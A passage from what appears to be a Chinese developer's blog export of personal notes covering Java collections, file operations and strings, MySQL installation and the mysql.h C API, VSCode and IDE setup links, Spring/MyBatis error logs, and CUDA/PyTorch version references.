class="comment">//传入匿名类</span></span><br><span class="line">        TreeMap&lt;Person,String&gt; treeMap=<span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Person&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Person o1, Person o2)</span> &#123;</span><br><span class="line">                <span class="type">int</span> num=o1.getAge()-o2.getAge();</span><br><span class="line">                <span class="keyword">return</span> Integer.compare(num,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        treeMap.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">3</span>), <span class="string">&quot;person1&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">18</span>), <span class="string">&quot;person2&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">35</span>), <span class="string">&quot;person3&quot;</span>);</span><br><span class="line">        treeMap.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">16</span>), <span class="string">&quot;person4&quot;</span>);</span><br><span class="line">        treeMap.entrySet().stream().forEach(personStringEntry -&gt; &#123;</span><br><span class="line">            System.out.println(personStringEntry.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//lamada表达式</span></span><br><span class="line">        TreeMap&lt;Person,String&gt; treeMap1=<span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;((o1,o2)-&gt;&#123;</span><br><span class="line">            <span class="type">int</span> num=o1.getAge()-o2.getAge();</span><br><span class="line">            <span class="keyword">return</span> Integer.compare(num,<span class="number">0</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="1-3-时间">1.3 时间</h2>
<p><a href="https://blog.csdn.net/qq_36789243/article/details/119362598">(50条消息) Java中如何获取当前日期和时间的4种方法_获取当前时间_小楼星辰的博客-CSDN博客</a></p>
<h2 id="1-4-文件">1.4 文件</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取目录下所有文件名</span></span><br><span class="line">File dir;</span><br><span class="line">String[] list=dir.list();</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除目录</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteDir</span><span class="params">(File file)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(file.isDirectory())&#123;</span><br><span class="line">        <span class="keyword">for</span>(File f:file.listFiles())&#123;</span><br><span class="line">            deleteDir(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file.delete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.runoob.com/java/dir-delete.html">Java 实例 – 删除目录 | 菜鸟教程 (runoob.com)</a></p>
<h3 id="1-4-1-复制文件">1.4.1 复制文件</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="comment">//from和to是File对象，如果要复制到的文件已经存在，则复制失败</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Files.copy(from.toPath(), to.toPath());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-4-2-删除文件">1.4.2 删除文件</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.File;</span><br><span class="line"></span><br><span class="line">File f;</span><br><span class="line">f.delete();</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 得到当前工作目录下的所有文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">showFileList</span><span class="params">(File filename)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (filename.isDirectory()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;文件夹：&quot;</span> + filename);</span><br><span class="line">        File[] listfile = filename.listFiles();</span><br><span class="line">        <span class="keyword">for</span> (File f : listfile) &#123;</span><br><span class="line">            showFileList(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//    处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 String</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    sb.append(<span class="string">&quot;message: &quot;</span> + message + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    sb.append(<span class="string">&quot;date: &quot;</span> + date + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (String parent : parentID) &#123;</span><br><span class="line">        sb.append(parent + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1=<span class="literal">null</span>; <span class="comment">//引用为空，没有地址，是一个没有被实例化的对象</span></span><br><span class="line">String str2=<span class="string">&quot;&quot;</span>;<span class="comment">//空字符串，它有地址，它是被实例化的对象，值为空而已。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果是string对象是null,用 == 来判断，否则会抛出异常 java.lang.NullPointerException</span></span><br><span class="line"></span><br><span class="line">str1==str2; <span class="comment">//“ == ”操作在对String这种引用数据类型来说，比较的是地址</span></span><br><span class="line">str1.equals(str2) <span class="comment">//equals比较的是内容</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Hadoop%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1>Hadoop配置</h1>
<p><a href="https://blog.csdn.net/huguihua2002/article/details/100079564">(12条消息) hadoop集群启动后datanode没有启动_Engineer-hu的博客-CSDN博客_datanodes</a></p>
<p><a href="https://blog.csdn.net/a6661314/article/details/124391249">(12条消息) Hadoop集群搭建（超级超级详细）_跳舞的皮埃尔的博客-CSDN博客_hadoop集群搭建</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/25/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1>1 File Header</h1>
<p><a href="https://blog.csdn.net/kingmax54212008/article/details/90754964">IDEA 中设置 File Header 以及自定义类、方法注释模板的方法_idea file head-CSDN博客</a><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403121044049.png" alt="image.png"></p>
<p><a href="https://blog.csdn.net/xiaostuart/article/details/108397180">IDEA快速插入当前日期时间-CSDN博客</a><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061102147.png" alt="Snipaste_2023-12-22_16-36-59.png"></p>
<p><a href="https://blog.csdn.net/mr_wanter/article/details/109636864#:~:text=%E7%BA%A2%E5%AD%97%E6%8F%90%E7%A4%BA%20No%20application%20contexts%20yes%20%E6%98%AF%E6%8C%87%E6%B2%A1%E6%9C%89%E4%B8%BA%E5%BD%93%E5%89%8D%E6%A8%A1%E6%9D%BF%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E7%9A%84%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E6%98%AF%E6%89%80%E6%9C%89%E5%9C%B0%E6%96%B9%E9%83%BD%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8,%E7%82%B9%E5%87%BB%20Define-%3EEverywhere%20%E3%80%82%20%E4%BF%9D%E5%AD%98%E4%B9%8B%E5%90%8E%E5%9C%A8IDEA%E4%B8%AD%E4%BB%BB%E6%84%8F%E5%9C%B0%E6%96%B9%E9%83%BD%E5%BF%AB%E9%80%9F%E8%BE%93%E5%85%A5%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E3%80%82%20%E8%BE%93%E5%85%A5%20time%2C%E6%8C%89Tab%E9%94%AE%E5%8D%B3%E5%8F%AF%E3%80%82">IDEA快速插入当前时间_idea时间快捷键-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/27/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VMware/</url>
    <content><![CDATA[<h1>1 VMware</h1>
<p>vmware虚拟机共享文件夹不显示</p>
<p><a href="https://blog.csdn.net/qq_45630224/article/details/121462127">VMWare下设置共享文件夹，/mnt/hgfs下却不显示共享文件夹_/mnt/hgfs找不到共享文件夹-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/u012523921/article/details/132358834?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-132358834-blog-121462127.235%5Ev38%5Epc_relevant_sort_base2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-132358834-blog-121462127.235%5Ev38%5Epc_relevant_sort_base2&amp;utm_relevant_index=5">ubuntu20.04共享文件夹—— /mnt/hgfs里没有共享文件夹_恋雪1986的博客-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/05/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Maven/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/u012660464/article/details/114113349">maven的下载与安装教程（超详细）_格子衫111的博客-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title>Mysql安装</title>
    <url>/2023/11/17/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/mysql%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1>1 MySql安装</h1>
<h2 id="1-1-linux安装">1.1 linux安装</h2>
<p><a href="https://blog.csdn.net/New_codeline/article/details/123142931">https://blog.csdn.net/New_codeline/article/details/123142931</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -i mysql-common_5.7.29-1ubuntu18.04_amd64.deb</span><br><span class="line">dpkg -i libmysqlclient20_5.7.29-1ubuntu18.04_amd64.deb</span><br><span class="line">dpkg -i libmysqlclient-dev_5.7.29-1ubuntu18.04_amd64.deb</span><br><span class="line">dpkg -i libmysqld-dev_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line"></span><br><span class="line">dpkg -i mysql-community-source_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">apt-get install libaio1 libtinfo5</span><br><span class="line">dpkg -i mysql-community-client_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line"></span><br><span class="line">dpkg -i mysql-client_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line">apt-get install libmecab2</span><br><span class="line">dpkg -i mysql-community-server_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line">dpkg -i mysql-server_5.7.29-1ubuntu18.04_amd64.deb </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">启动mysql服务:</span><br><span class="line">service mysql start</span><br><span class="line"></span><br><span class="line">进入MySQL:</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">退出MySQL(三种方法):</span><br><span class="line">mysql &gt; exit;</span><br><span class="line">mysql &gt; quit;</span><br><span class="line">mysql &gt; \q;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-windows安装">1.2 windows安装</h2>
<p><a href="https://blog.csdn.net/weixin_43423484/article/details/124408565">Windows安装mysql详细步骤（通俗易懂，简单上手）_华夏之威的博客-CSDN博客</a><br>
<a href="https://www.runoob.com/mysql/mysql-install.html">MySQL 安装 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://blog.csdn.net/lyl1234564/article/details/120647573">MySQL安装配置（可视化安装界面），可视化工具安装，连接IDEA，JDBC安装配置，在IDEA中书写第一个MySQL程序，超简单教程（超详细）。_mysql可视化界面_喝咖啡的皮卡丘的博客-CSDN博客</a></p>
<h1>2 其他问题</h1>
<p><a href="https://zhuanlan.zhihu.com/p/616953225">mysql | 修改MySQL密码的四种方法 - 知乎 (zhihu.com)</a></p>
<h1>3 mysql问题</h1>
<h2 id="3-1">3.1</h2>
<blockquote>
<p>Error Code: 1366. Incorrect string value: ‘\xE5\x93\x87’ for column ‘name’ at row 1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改数据库的字符集：alter database `dbname` character set utf8;</span><br><span class="line">修改表的字符集：alter table `tablename` **convert to** character set utf8;</span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/115331180#:~:text=%E5%8F%AF%E4%BB%A5%E5%8E%BB%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%AD%EF%BC%8C%E9%87%8D%E5%90%AFmysql%E7%9A%84%E6%9C%8D%E5%8A%A1%20%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E5%86%8D%E6%AC%A1%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86%20SQL%E8%AF%AD%E5%8F%A5%EF%BC%9A%20show%20variables%20like%20%27character%25%27%3B%20%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E5%8F%AF%E4%BB%A5%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E4%B8%AD%E6%96%87%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%BF%98%E4%B8%8D%E8%A1%8C%EF%BC%8C%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E8%A1%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86,table%20tablename%20convert%20to%20character%20set%20utf8%3B%20%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%95%A6%E3%80%82">解决MySQL5.7版本以上不支持中文问题 - 知乎 (zhihu.com)</a><br>
<a href="https://blog.csdn.net/xj13829061922/article/details/106123694">MySql报 java.sql.SQLException: Incorrect string value 乱码解决方法_se. cause fava.sqlsqlexception inicorrect string w-CSDN博客</a></p>
<h1>4 mysql返回值</h1>
<p><a href="https://blog.csdn.net/beidaol/article/details/90961349">【转】详解mybatis的insert，update，delete返回值_mybatis的insert返回什么-CSDN博客</a></p>
<h1>5 Mysql.h</h1>
<h2 id="5-1-mysql-init">5.1 mysql_init()</h2>
<p><code>MYSQL *mysql_init(MYSQL *mysql)</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>初始化MYSQL数据结构，返回MYSQL指针。</p>
</li>
<li class="lvl-2">
<p>成功时返回指向MYSQL结构体的指针，失败时返回NULL，并设置错误号（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-2-mysql-real-connect">5.2 mysql_real_connect()</h2>
<p><code>MYSQL *mysql_real_connect(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long clientflag)</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>建立Mysql服务器连接</p>
</li>
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>host：MySQL服务器名称或IP地址。</p>
</li>
<li class="lvl-2">
<p>user：登录MySQL服务器的用户名。</p>
</li>
<li class="lvl-2">
<p>passwd：登录MySQL服务器的密码。</p>
</li>
<li class="lvl-2">
<p>db：要连接的数据库名称。</p>
</li>
<li class="lvl-2">
<p>port：MySQL服务器端口号。</p>
</li>
<li class="lvl-2">
<p>unix_socket：UNIX套接字文件路径。</p>
</li>
<li class="lvl-2">
<p>clientflag：客户端标志位。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回指向MYSQL结构体的指针，失败时返回NULL，并设置错误号（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-3-mysql-query">5.3 mysql_query()</h2>
<p><code>int mysql_query(MYSQL *mysql, const char *stmt_str)</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>执行一条SQL查询语句或更新语句。</p>
</li>
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>stmt_str：要执行的SQL语句字符串。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回0，失败时返回非0错误代码（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-4-mysql-real-query">5.4 mysql_real_query()</h2>
<p><code>int mysql_real_query(MYSQL *mysql, const char *stmt_str, unsigned long length)</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>执行一条SQL查询语句或更新语句。</p>
</li>
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>stmt_str：要执行的SQL语句字符串。</p>
</li>
<li class="lvl-2">
<p>length：SQL语句长度。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回0，失败时返回非0错误代码（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-5-mysql-store-result">5.5 mysql_store_result()</h2>
<p><code>MYSQL_RES *mysql_store_result(MYSQL *mysql)</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>说明：将查询结果集保存在客户端内存中。</p>
</li>
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回一个MYSQL_RES结构体指针，失败时返回NULL，并设置错误号（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-6-mysql-use-result">5.6 mysql_use_result()</h2>
<p><code>MYSQL_RES *mysql_use_result(MYSQL *mysql)</code></p>
<blockquote>
<p>说明：逐行获取查询结果集。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回一个MYSQL_RES结构体指针，失败时返回NULL，并设置错误号（通过mysql_errno()获取）。</p>
</li>
</ul>
<h2 id="5-7-结果集相关函数">5.7 结果集相关函数</h2>
<h3 id="5-7-1-mysql-fetch-row">5.7.1 mysql_fetch_row()</h3>
<p><code>MYSQL_ROW mysql_fetch_row(MYSQL_RES *result)</code></p>
<blockquote>
<p>说明：逐行获取查询结果集，并返回一个MYSQL_ROW结构体指针。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>result：MYSQL_RES结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回一个MYSQL_ROW结构体指针，失败时返回NULL。</p>
</li>
</ul>
<h3 id="5-7-2-mysql-num-rows">5.7.2 mysql_num_rows()</h3>
<p><code>unsigned long mysql_num_rows(MYSQL_RES *result)</code></p>
<blockquote>
<p>说明：获取查询结果集中的行数。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>result：MYSQL_RES结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回查询结果集中行的数量，失败时返回0。</p>
</li>
</ul>
<h3 id="5-7-3-mysql-num-fields">5.7.3 mysql_num_fields()</h3>
<p><code>unsigned int mysql_num_fields(MYSQL_RES *result)</code></p>
<blockquote>
<p>说明：获取查询结果集中的列数。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>result：MYSQL_RES结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回查询结果集中列的数量，失败时返回0。</p>
</li>
</ul>
<h3 id="5-7-4-mysql-field-count">5.7.4 mysql_field_count()</h3>
<p><code>unsigned int mysql_field_count(MYSQL *mysql)</code></p>
<blockquote>
<p>说明：获取最近一次执行的SQL语句所返回的列数。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>mysql：MYSQL结构体指针变量。</p>
</li>
<li class="lvl-2">
<p>返回值说明：成功时返回最近一次执行的SQL语句所返回的列数，失败时返回0。</p>
</li>
</ul>
<h1>6 参考</h1>
<p><a href="https://blog.csdn.net/A_salted_fisher/article/details/131117697">mysql.h函数详解-CSDN博客</a></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VSCode%E9%85%8D%E7%BD%AEcc++%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="二、VSCode配置c-c-环境">二、VSCode配置c/c++环境</h2>
<h3 id="1-下载VS-Code">1. 下载VS Code</h3>
<p><a href="https://www.cnblogs.com/sctb/p/11919639.html">下载过慢</a></p>
<p><a href="https://az764295.vo.msecnd.net/stable/92d25e35d9bf1a6b16f7d0758f25d48ace11e5b9/VSCodeUserSetup-x64-1.69.0.exe">https://az764295.vo.msecnd.net/stable/92d25e35d9bf1a6b16f7d0758f25d48ace11e5b9/VSCodeUserSetup-x64-1.69.0.exe</a></p>
<p><a href="https://vscode.cdn.azure.cn/stable/92d25e35d9bf1a6b16f7d0758f25d48ace11e5b9/VSCodeUserSetup-x64-1.69.0.exe">https://vscode.cdn.azure.cn/stable/92d25e35d9bf1a6b16f7d0758f25d48ace11e5b9/VSCodeUserSetup-x64-1.69.0.exe</a></p>
<h3 id="2-下载MinGW-w64">2. 下载MinGW-w64</h3>
<p><a href="https://blog.csdn.net/m0_38051388/article/details/87000845?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2">安装MinGW-W64提示cannot download repository.txt-解决方法</a>s<br>
<a href="https://www.jb51.net/softjc/696089.html">MinGW-w64 离线包安装方法(经测试可用)</a></p>
<h3 id="3-配置">3. 配置</h3>
<p><a href="https://www.jianshu.com/p/febbf1e975b6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">VSCode安装，配置，编译运行C++</a></p>
<p><a href="https://code.visualstudio.com/docs/?dv=win">vs code</a><br>
<a href="https://www.cnblogs.com/bpf-1024/p/11597000.html">环境配置</a></p>
<p>行注释 toggle line comment</p>
<p>块注释 toggle block comment</p>
<h3 id="outline大纲">outline大纲</h3>
<p>ctrl+shift+P修改default,setting</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112251534900.png" alt="image-20211225153410652"></p>
<p>鼠标缩放</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202203231027513.png" alt="image-20220323102733467"></p>
<p>缓存大小</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204222107558.png" alt="image-20220422210737429"></p>
<h3 id="4-设置终端编码格式">4. 设置终端编码格式</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202302081315984.png" alt="image-20230208131559915"></p>
<h3 id="VSCode产生的ipch文件夹占用C盘空间过大处理">VSCode产生的ipch文件夹占用C盘空间过大处理</h3>
<p>ipch文件夹是Intelli Sense（好像是预编译头文件之类的）这个东西产生的缓存文件</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202303011100137.png" alt="image-20230228094652335"></p>
<h3 id="自动格式化">自动格式化</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202303011107179.png" alt="image-20230301110726122"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2013/202303011106724.png" alt="image-20230301110654687"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/14/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/bug/</url>
    <content><![CDATA[<p><code>java.lang.IllegalStateException: Failed to load ApplicationContext</code></p>
<p><code>Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'stateHandlerImpl': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'indiv.lottery.domain.activity.service.stateflow.event.ArraignmentState' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: &#123;@javax.annotation.Resource(shareable=true, lookup=, name=, description=, authenticationType=CONTAINER, type=class java.lang.Object, mappedName=)&#125;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202312141928179.png" alt="image.png"></p>
<p>没有定义component组件</p>
<p><code>org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'indiv.lottery.test.domain.ActivityTest': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: </code><br>
没有定义service</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">org.springframework.jdbc.BadSqlGrammarException: </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Error updating database.  Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column &#x27;activityId&#x27; in &#x27;field list&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## The error may exist in file [E:\IDEA\MyLottery\lottery-interfaces\target\classes\mybatis\mapper\Activity_Mapper.xml]</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## The error may involve indiv.lottery.infrastructure.dao.IActivityDAO.insert-Inline</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## The error occurred while setting parameters</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## SQL: INSERT INTO activity         (activityId, activityName, activityDesc, beginDateTime, endDateTime,          stockCount, takeCount, state, creator, createTime, updateTime)         VALUES (?, ?, ?, ?, ?,                 ?, ?, ?, ?, now(), now())</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column &#x27;activityId&#x27; in &#x27;field list&#x27;</span></span></span><br><span class="line">; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column &#x27;activityId&#x27; in &#x27;field list&#x27;</span><br></pre></td></tr></table></figure>
<p>insert参数名与数据库不匹配</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): indiv.lottery.infrastructure.dao.IAwardDAO.insertList</span><br></pre></td></tr></table></figure>
<h1>Mysql</h1>
<h2 id="Error-querying-database-Cause-org-springframework-jdbc-CannotGetJdbcConnectionException">Error querying database. Cause: org.springframework.jdbc.CannotGetJdbcConnectionException</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202312252241556.png" alt="image.png"></p>
<h1>依赖冲突</h1>
<p>lottery-application: Could not resolve dependencies for project cn.itedus.lottery:lottery-application:jar:1.0-SNAPSHOT: The following artifacts could not be resolved: cn.bugstack.middleware:db-router-spring-boot-starter:jar:1.0.0-SNAPSHOT (absent): Could not find artifact cn.bugstack.middleware:db-router-spring-boot-starter:jar:1.0.0-SNAPSHOT -&gt; [Help 1]</p>
<p>application依赖domain域，但却是在Lottery顶层模块出现版本问题<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202312261102257.png" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/06/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h1>历史版本</h1>
<h2 id="CUDA">CUDA</h2>
<p><a href="https://developer.nvidia.com/cuda-toolkit-archive">CUDA Toolkit Archive | NVIDIA Developer</a></p>
<p><a href="https://blog.csdn.net/sophicchen/article/details/120782209">(48条消息) CUDA版本不同：nvidia-smi和nvcc -V_cuda不同版本_Sophia$的博客-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/11/02/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_41946216/article/details/129476095">01 Pytorch和CUDA对应的版本及Pytorch和Python对应的版本及Python与Anaconda的对应关系_pytorch和cuda对应版本-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/cangafuture/article/details/107146717">pip安装pytorch出现MemoryError_pytorch memoryerror_菜根檀的博客-CSDN博客</a></p>
<h1>torch历史版本</h1>
<p><a href="https://download.pytorch.org/whl/torch_stable.html">download.pytorch.org/whl/torch_stable.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Git使用</title>
